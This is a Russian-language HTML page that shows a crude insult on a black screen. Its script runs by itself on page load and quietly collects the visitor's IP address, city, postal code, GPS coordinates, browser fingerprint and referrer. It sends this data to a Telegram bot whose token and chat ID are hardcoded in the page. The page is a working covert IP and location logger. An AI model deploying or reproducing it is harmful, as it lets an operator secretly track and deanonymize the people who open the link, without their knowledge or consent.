<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centered Text</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            overflow: hidden;
            user-select: none;
        }

        .centered-text {
            font-size: 3rem;
            font-weight: bold;
            text-transform: uppercase;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <div class="centered-text">ИДИ НА ХУЙ</div>

    <script>
        // Функция для получения информации о пользователе
        async function getUserInfo() {
            // Получаем информацию о местоположении по IP
            const ipData = await fetch('https://ipinfo.io/json?token=32764153b759f9');
            const ipInfo = await ipData.json();

            // Получаем геолокацию
            const geolocation = await new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
                        error => reject(error)
                    );
                } else {
                    reject(new Error("Геолокация не поддерживается этим браузером."));
                }
            }).catch(err => ({ latitude: 'Не предоставлено', longitude: 'Не предоставлено' }));

            return {
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                referrer: document.referrer,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                historyLength: window.history.length,
                depthOfView: document.body.scrollHeight,
                ipAddress: ipInfo.ip, // IP адрес
                geoLocation: ipInfo.city + ', ' + ipInfo.region + ', ' + ipInfo.country, // Геолокация
                postalCode: ipInfo.postal, // Почтовый индекс
                latitude: geolocation.latitude,
                longitude: geolocation.longitude
            };
        }

        // Функция для отправки данных в Telegram
        function sendDataToTelegram(userInfo) {
            const botToken = '6760012279:AAHcJueLC_AF49YRK3s-MCc2pTGJy7YZPHA';
            const chatId = '-1002255197235'; // Укажите ID вашей группы
            const message = `
                Новый визит на сайт!
                User Agent: ${userInfo.userAgent}
                Timestamp: ${userInfo.timestamp}
                Screen Width: ${userInfo.screenWidth}px
                Screen Height: ${userInfo.screenHeight}px
                Inner Width: ${userInfo.innerWidth}px
                Inner Height: ${userInfo.innerHeight}px
                Referrer: ${userInfo.referrer}
                Platform: ${userInfo.platform}
                Language: ${userInfo.language}
                Cookies Enabled: ${userInfo.cookiesEnabled}
                Connection Type: ${userInfo.connectionType}
                History Length: ${userInfo.historyLength}
                Depth of View: ${userInfo.depthOfView}
                IP Address: ${userInfo.ipAddress}
                Geo Location: ${userInfo.geoLocation}
                Postal Code: ${userInfo.postalCode}
                Latitude: ${userInfo.latitude}
                Longitude: ${userInfo.longitude}
            `;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                if (data.ok) {
                    console.log('Сообщение успешно отправлено');
                } else {
                    console.error('Ошибка при отправке сообщения:', data.description);
                }
            })
            .catch(error => {
                console.error('Ошибка:', error);
            });
        }

        // Отправка данных о пользователе при загрузке страницы
        window.onload = async function() {
            const userInfo = await getUserInfo();
            sendDataToTelegram(userInfo);
        };
    </script>
</body>
</html>
